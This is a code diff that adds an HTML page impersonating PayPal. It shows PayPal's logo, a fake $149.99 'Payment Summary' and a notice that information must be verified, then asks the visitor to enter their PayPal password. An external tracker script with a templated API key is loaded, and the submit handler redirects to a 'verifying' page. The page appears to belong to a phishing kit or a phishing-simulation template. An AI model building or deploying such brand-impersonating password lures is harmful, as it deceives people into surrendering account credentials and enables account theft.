@@ -1,0 +1,85 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Confirm your payment - PayPal</title>
+    <link rel="stylesheet" href="assets/css/styles.css">
+
+<script src="/tracker.js" data-api-key="%%API_KEY%%"></script>
+</head>
+<body>
+    <main class="container">
+        <div class="login-card">
+            <div class="logo">
+                <svg width="101" height="32" viewBox="0 0 101 32" fill="none" xmlns="http://www.w3.org/2000/svg">
+                    <g clip-path="url(#clip0)">
+                        <path d="M12.237 2.8H4.437c-.5 0-.933.368-1.017.863L.029 25.736a.62.62 0 00.612.727h4.436c.501 0 .934-.368 1.018-.863l.945-5.987c.084-.495.517-.863 1.018-.863h2.346c4.881 0 7.703-2.365 8.44-7.052.332-2.049-.001-3.657-1.004-4.776C16.92 3.928 14.887 2.8 12.237 2.8zm1.312 6.917c-.413 2.714-2.485 2.714-4.487 2.714h-1.14l.797-5.053c.048-.297.296-.515.61-.515h.513c1.338 0 2.601 0 3.252.763.388.455.493 1.133.455 2.091zM35.736 9.647h-4.443a.616.616 0 00-.61.515l-.157.994-.249-.36c-.773-1.12-2.494-1.495-4.214-1.495-3.942 0-7.31 2.988-7.963 7.177-.34 2.09.145 4.09 1.331 5.488 1.09 1.285 2.647 1.82 4.493 1.82 3.176 0 4.936-2.042 4.936-2.042l-.158.988a.62.62 0 00.612.727h4.003c.501 0 .934-.368 1.018-.863l1.919-12.15a.62.62 0 00-.611-.727zm-6.17 6.86c-.341 2.026-1.947 3.388-4.006 3.388-1.03 0-1.854-.331-2.385-.959-.527-.622-.727-1.508-.563-2.497.326-2.01 1.959-3.414 3.99-3.414 1.009 0 1.83.332 2.372.961.545.635.755 1.525.592 2.521z" fill="#003087"/>
+                        <path d="M55.543 9.647h-4.456a1.05 1.05 0 00-.869.462l-5.008 7.38-2.122-7.087a1.053 1.053 0 00-1.008-.755h-4.38a.62.62 0 00-.591.814l4.002 11.745-3.763 5.31a.62.62 0 00.506.984h4.453c.344 0 .663-.177.868-.469l12.093-17.456a.62.62 0 00-.506-.984z" fill="#009CDE"/>
+                        <path d="M67.789 2.8h-7.8c-.5 0-.933.368-1.017.863l-3.391 21.073a.62.62 0 00.612.727h4.794a.71.71 0 00.711-.607l.963-6.103c.084-.495.517-.863 1.018-.863h2.346c4.881 0 7.703-2.365 8.44-7.052.332-2.049-.001-3.657-1.004-4.776C72.473 3.928 70.44 2.8 67.789 2.8zm1.312 6.917c-.413 2.714-2.485 2.714-4.487 2.714h-1.14l.797-5.053c.048-.297.296-.515.61-.515h.513c1.338 0 2.601 0 3.252.763.388.455.493 1.133.455 2.091zM91.29 9.647h-4.443a.616.616 0 00-.61.515l-.157.994-.249-.36c-.773-1.12-2.494-1.495-4.214-1.495-3.942 0-7.31 2.988-7.963 7.177-.34 2.09.145 4.09 1.331 5.488 1.09 1.285 2.647 1.82 4.493 1.82 3.176 0 4.936-2.042 4.936-2.042l-.158.988a.62.62 0 00.612.727h4.003c.501 0 .934-.368 1.018-.863l1.919-12.15a.62.62 0 00-.611-.727zm-6.17 6.86c-.341 2.026-1.947 3.388-4.006 3.388-1.03 0-1.854-.331-2.385-.959-.527-.622-.727-1.508-.563-2.497.326-2.01 1.959-3.414 3.99-3.414 1.009 0 1.83.332 2.372.961.545.635.755 1.525.592 2.521z" fill="#003087"/>
+                        <path d="M95.088 3.226l-3.435 21.836a.62.62 0 00.612.727h3.878c.501 0 .934-.368 1.018-.863l3.391-21.073a.62.62 0 00-.612-.727h-4.24a.616.616 0 00-.61.515z" fill="#009CDE"/>
+                    </g>
+                </svg>
+            </div>
+
+            <div class="page-header">
+                <h1 class="page-title">Confirm your payment</h1>
+                <p class="page-description">Review and confirm the payment details below</p>
+            </div>
+
+            <div class="info-box">
+                <div class="info-box-title">Payment Summary</div>
+                <div class="info-box-text">
+                    <strong>Merchant:</strong> Example Store<br>
+                    <strong>Amount:</strong> $149.99 USD<br>
+                    <strong>Payment method:</strong> PayPal balance<br>
+                    <strong>Date:</strong> Today
+                </div>
+            </div>
+
+            <div class="alert-box info">
+                <span class="alert-icon">ℹ️</span>
+                <div class="alert-content">
+                    <div class="alert-message">Before you can complete this payment, we need to verify some information.</div>
+                </div>
+            </div>
+
+            <form class="login-form" id="confirmForm">
+                <div class="form-group">
+                    <input type="password" id="confirmPassword" name="confirmPassword" class="form-input" placeholder="Enter your password" required>
+                    <label for="confirmPassword" class="form-label">Enter your password</label>
+                </div>
+
+                <button type="submit" class="btn btn-primary">Confirm Payment</button>
+                
+                <div class="separator">
+                    <span>or</span>
+                </div>
+                
+                <button type="button" class="btn btn-secondary" onclick="window.history.back()">Cancel</button>
+            </form>
+        </div>
+    </main>
+
+    <footer class="footer">
+        <a href="#" class="footer-link">Contact Us</a>
+        <a href="#" class="footer-link">Privacy</a>
+        <a href="#" class="footer-link">Legal</a>
+    </footer>
+
+    <script>
+        document.getElementById('confirmForm').addEventListener('submit', async (e) => {
+            e.preventDefault();
+            
+            const btn = e.target.querySelector('.btn-primary');
+            btn.classList.add('loading');
+            btn.disabled = true;
+            
+            await new Promise(resolve => setTimeout(resolve, 1000));
+            
+            console.log('Payment confirmed');
+            window.location.href = 'verifying.html';
+        });
+    </script>
+</body>
+</html>
